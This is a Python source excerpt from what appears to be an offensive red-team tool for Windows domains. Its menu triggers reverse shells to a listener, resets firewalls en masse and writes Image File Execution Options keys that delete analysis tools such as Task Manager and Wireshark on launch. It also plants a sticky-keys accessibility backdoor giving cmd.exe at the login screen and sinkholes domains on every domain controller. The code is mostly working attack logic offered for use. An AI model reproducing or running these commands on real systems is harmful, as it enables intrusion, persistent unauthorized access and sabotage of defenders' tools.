    # Trigger the reverse shell
    print(f"Triggering reverse shell on {target}...")
    status, response = spawn_reverse_shell(target, PORT, listener_ip, listener_port)
    
    if status in ["SUCCESS", 200]:  # Check for both SUCCESS and 200
        try:
            listener_thread.join()
        except KeyboardInterrupt:
            print("\nStopped by user")
    else:
        print("❌ Failed to trigger reverse shell")
        print(f"Provided Error: {response}")
        listener_thread.join(timeout=1)

def main():
    subprocess.run("clear")
    ascii_art()
    
    # Show local IP at startup
    selected_ip = select_local_ip()
    print()
    
    while True:
        action = main_interface()
        if action is None:
            print("Goodbye.")
            break
            
        if action == "SINGULAR":
            singular_execution()
        elif action == "MASS":
            mass_execution()
        elif action == "SHELL":
            shell_execution(selected_ip)
        elif action == "FIREWALL":
            command = "netsh advfirewall reset"
            mass_execution(command)
        elif action == "IFEO":
            target_processes = (
                "wireshark.exe", "taskmgr.exe", "autoruns.exe", "autoruns64.exe",
                "procexp.exe", "procexp64.exe", "procmon.exe", "procmon64.exe", 
                "strings.exe"
            )
    
            processes_string = " ".join(target_processes)
            command = (
                f"for %i in ({processes_string}) do @reg add "
                f"\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%i\" "
                f"/v Debugger /t REG_SZ /d \"cmd.exe /c del /f /q \"%i\"\" /f"
            )
            mass_execution(command)
        elif action == "UTILITY":
            target_processes = (
                "sethc.exe", "utilman.exe", "osk.exe", "displayswitch.exe",
                "magnify.exe", "narrator.exe"
            )

            processes_string = " ".join(target_processes)
            command = (
                f"reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v \"DisabledHotkeys\" /t REG_SZ /d \"\" /f & "
                f"reg add \"HKCU\\Control Panel\\Accessibility\\StickyKeys\" /v \"Flags\" /t REG_SZ /d \"510\" /f & "
                f"reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\" /v \"Configuration\" /t REG_SZ /d \"stickykeys\" /f & "
                f"for %i in ({processes_string}) do @reg add "
                f"\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%i\" "
                f"/v Debugger /t REG_SZ /d cmd.exe /f"
            )
            mass_execution(command)
        elif action == "SSH":
            print("SSH Key Dropping coming soon!")
        elif action == "SINKHOLE":
            domains = inquirer.text(
                message="Enter domains to sinkhole using DNS (e.g., github.com,gitlab.com):",
                style=text_style
            ).execute()
            domains = domains.split(",")
            full_command = ""
            for domain in domains:
                command = (
                    f"powershell -c Add-DnsServerPrimaryZone -Name \"{domain}\" -ReplicationScope \"Domain\" -DynamicUpdate \"None\"; "
                    f"powershell -c Add-DnsServerResourceRecordA -Name \"*\" -ZoneName \"{domain}\" -IPv4Address \"8.8.8.8\"; "
                )
                full_command += command
            full_command = full_command[:-2]
            mass_execution(full_command, targets=ALL_DC)
        elif action == "CALLBACK":
            command = "whoami"
            mass_execution(command, callback=True)
        elif action == "VIEW_CALLBACKS":
            display_callbacks()
        else:
            print("Unknown action, returning to menu.")
        
        print()

if __name__ == "__main__":
    main()
